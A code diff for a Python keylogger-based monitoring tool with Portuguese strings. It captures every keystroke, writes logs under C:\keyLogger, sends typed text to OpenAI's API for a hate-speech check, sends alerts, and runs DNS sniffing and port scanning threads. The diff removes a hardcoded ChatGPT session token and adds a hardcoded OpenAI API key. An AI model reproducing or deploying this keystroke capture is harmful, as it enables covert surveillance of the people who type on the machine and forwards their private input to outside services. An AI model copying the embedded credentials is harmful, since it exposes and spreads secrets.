@@ -16,10 +16,9 @@ import credenciais as cr  # For API
 import threading    # For paralelism
 import socket   # For Scanner
 from IPy import IP  # For Scanner
-from pyChatGPT import ChatGPT
+import openai
 
-SESSION_TOKEN = 'eyJhbGciOiJkaXIiLCJlbmMiOiJBMjU2R0NNIn0..DhAnMOlqZKlLC4ug.p4iLKtftZq-lA5sqParHU6dIKU2ZxCiGQxIT3Wj5Wed7t-R6hQe8iUUCeW4mLPkcKE20JwnwhPgD8niXQgy69dRbHd4ovegp0M5bFt2_vgK7ayHm5K2vxCL9AzyRm4S0_qglD0lzaBDTC1_4M3fYYdZCt3s8kIUF_JgGhrzUs3fp62_bzWKjXJjp85vRnFKM2jaXX9vdPepmSaYtRBzStBtL2KK7-LIJ_8dX4xfK_ba2-lFEtw9ZDuNrF15S8sbIYGqjRpPExt925kO0dQa4kLEFjuSgJfN0v5DzQve_QlW3JvO1Ch0ZHd5_nzColzWR7bzAHxhKNdYXlyMlSttQ50se-UkEGPrK42-ZF7MxLT59g_CuyxQePouw2LQs9Db5qWoQXGvq0ala7NnbjkRakXjqYcDqFR2cpIZehY6coDV12Bb_W8t400Cp0DvYnWaQwr7vS7qkySJphp2GRNioD8m-WHVPjnWAccs4tp1UumIqC98pkakNkmvtPzGudy5jaWBS0OiQoWXIbw25IletL7VUDnsP-hczVn4ewW0-m4myroRhpRQPKY2ptLFxJ0iJ_qgraA5u9nuWiFNth0LKSVbYXpVEeGCX6SOpIPVpyxqlW_oI73WZe7n7LcDVaxF_8JopOZUwkPHrj1UcyaV3SrEzD9puJmXm-5g_vLSEFJwUf_EoP07VguDTgvkyql-Fned1_yEcMyYJOXw7LBy7bYDuQauEZ_n5c5XyZuTIm4siVha--8HPkD7imciuGUl5G7int0sMzeNPVdVk_lFvNsIXpmEgiJG2R5-3fr22WBqXMrIO5r5AvQ7oZte39naomrhIqc1I0qTLs2R4pPwpgoq1g86lzTW9KkAYLPz3CE5NfYEyD5xk0_C2siHaHkjDaF2lZTdZNGs14uevIpYLZ3UVVoMoTMoSr-0axj5VRel5BUjxAcRuqaXub3JpPtPuSXzWn6lQLB0EzoTeD2K3eIYKEEssfLFXd86jS6xTaQb5cLgpCkUTlw4MIT6e7cdIx6-Iyypz3perX9Dm1mhQ_qWMHNa8gNw0HbXtdkxJPz8RcP_F11LeE9Za7EH-5SwJPoUPNjCKCsqnvBa4fHwtWxs9QE-3a9oeDy70-p5VEv-Q3f3UvOyn4dcthu_04noV1K00g2N1ySaI7N6t8sbMRB3g8f0U5_egqs3kUkyiSG74VKMRkha46HG0oBY3ebVfOiOtRNnsVdw3dXBi12z9Liwoi-N09Iwaw1IcruUHdusqA97oQbAm8X8L9NUm7-nqNEd4XKwE1HmJZuZ88R0Swqm7edismirUczmVS4McXZXhQb0a5tiXLMkn9XR2GuRX9_YNrpdptWp3gA-P0D_zO-g8mBY-6M25w5MV1Lw3rRoYGYlH_yCpw-DLBSIN6EXStosTGHz8bNoEccWwwa9tdMenaxF1QLfXEeOz5zxyMkvuROE0hVJDMU5aIGniv2tVpRBVEeCgKORqf2lBn4AloIuGOhE-koSsyznQC6qVAbY_1n-NZg-q0F91tDFOPF7pyoIBKSIl3hDf_EGM0MTLvC8NR8Ya5nBRAYyY7HeHEZJM6TtMIBWQkAn8_aocc86c6Tg_FlhiNeJNiPkGoN2OGqikqipwZEK1dfyP9J9iSyM-3IzlrOEdsayJ0YQ41ZWM8z0kE-FHWHLI6nWVI885IvH4PYjHHlENG5FIBmMTHuICexn_5j5lqSfBDgsZ7z49S9XghMKag9Rn3N4qzsb-9LTeqZMtZYvC-C0Vkux5Rwr5C5cSSvICUmM4DOxbD9N1cGYZgLEQtOjKIf8H4brfbTEsJmJdjpjzUUxkiJOBGkN2kOC4757aSP4bokufXpbcfQHOY2HtW_UiyGh9UlmrViFlCC-IRomVPx7y3RKX7hquEoZHZrJMxj-d7iXdMePVBbcpdgghqgSyYdZA_eNxvrAMBIoPH9Vsfq28gZnCwCV9BLUD41oEWJe5lL1_bvC1ccS5QD9GWd9z4h8a8eMwYGD0v0sKUeGdRVx6hfljcaEc3iduJqHLW35BwUkdYhGXWKywendRGql2wEFF69oCieTEpRg_dTu3j0O58FyilbENbJfWyB9oDyREwBr3uRPpy6-KE6_evhfP1_layesfrRFUx58mmN6dNz_j7mYzMkmy5M9G98b9U1noEhmSA4LAKaP0uqJ_DkCNr0lfZc4arRUHu0YFfcWRy7fToAMiM8GBq-DbgBYGJGToVRhrZRnQSa28zauPKUxBXnW0N99UUO8u2IOpaM9cAboF1i_n8Q7tdpoX_exZ.2Y2EwPKQLmj_3TCsj35b7g'
-SEND_REPORT_EVERY = 30
+
 PATH_OF_THE_LOGS = "C:\keyLogger\logs\logs_" + str(time.monotonic_ns()) + ".txt"
 
 
@@ -46,12 +45,13 @@ def is_hate_speech(self):
 
 def verifyng_hate_speech_chatGPT(text):
     try:
-        api = ChatGPT(SESSION_TOKEN)
-        str = 'Identifique se essa frase tem discurso de ódio: "' + text + '", responda com sim ou não.'
-        resp = api.send_message(str)
-        print(resp['message'])
-        api.reset_conversation()
-        if resp['message'].lower().find("sim.") == 0:
+        openai.api_key = "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"
+        response = openai.Completion.create(
+            model="text-davinci-003",
+            prompt='Identifique se essa frase tem discurso de ódio: "' + text + '". Responda com sim ou não',
+            temperature=0.6,
+        )
+        if response.choices[0].text.lower().find("sim") == 0:
             logging("Geração de alerta por discurso de ódio no ChatGPT: " + text)
             return True
         else:
@@ -165,47 +165,64 @@ class Sniffer(threading.Thread):
         sniff(filter='udp port 53', store=0, prn=self.sniffer)
 
 
+import keyboard
+
 class Keylogger:
-    def __init__(self, interval):
-        self.interval = interval
+    def __init__(self):
         self.log = ""
 
     def callback(self, event):
-        name = event.name
-        if len(name) > 1:
-            if name == "space":
-                name = " "
-            elif name == "enter":
-                name = "\n"
-            elif name == "decimal":
-                name = "."
-            elif name == "backspace":
-                name = ""
-                self.log = self.log[:-1]
-            elif name == "ctrl":
-                name = ""
-            elif name == "shift" or name == "caps lock":
-                name = ""
-            # else:
-            #     name = name.replace(" ", "_")
-            #     name = f"[{name.upper()}]"
-        self.log += name
+        if event.name == "enter":
+            self.report()
+        elif event.name == "space":
+            self.log += " "
+        elif event.name == "backspace":
+            self.log = self.log[:-1]
+        elif event.name == "caps lock":
+            pass  # ignore caps lock key
+        else:
+            # Get the character that corresponds to the key
+            if event.name.startswith("shift"):
+                shift_chars = self.get_shift_chars()
+                char = shift_chars.get(event.name, "")
+            else:
+                char = event.name
+            self.log += char
+
+    def get_shift_chars(self):
+        return {
+            "shift + 1": "!",
+            "shift + 2": "@",
+            "shift + 3": "#",
+            "shift + 4": "$",
+            "shift + 5": "%",
+            "shift + 6": "^",
+            "shift + 7": "&",
+            "shift + 8": "*",
+            "shift + 9": "(",
+            "shift + 0": ")",
+            "shift + -": "_",
+            "shift + =": "+",
+            "shift + [": "{",
+            "shift + ]": "}",
+            "shift + ;": ":",
+            "shift + '": "\"",
+            "shift + ,": "<",
+            "shift + .": ">",
+            "shift + /": "?",
+            "shift + `": "~",
+            "shift + \\": "|",
+        }
 
     def report(self):
         if self.log and (is_hate_speech(self) or is_bad_language(self) or are_malicious_process(self) or verifyng_hate_speech_chatGPT(self.log)):
             logging("Foi enviado o report!")
             send_alert(self.log)
-
         self.log = ""
-        timer = Timer(interval=self.interval, function=self.report)
-        timer.daemon = True
-        timer.start()
 
     def start(self):
         keyboard.on_release(callback=self.callback)
-        self.report()
         keyboard.wait()
-
 
 class Scanner(threading.Thread):
     def __init__(self):
@@ -287,6 +304,6 @@ if __name__ == "__main__":
     Scanner().start()
     Sniffer().start()
     logging("Iniciou do KeyLogger!")
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
+    keylogger = Keylogger()
     keylogger.start()
 
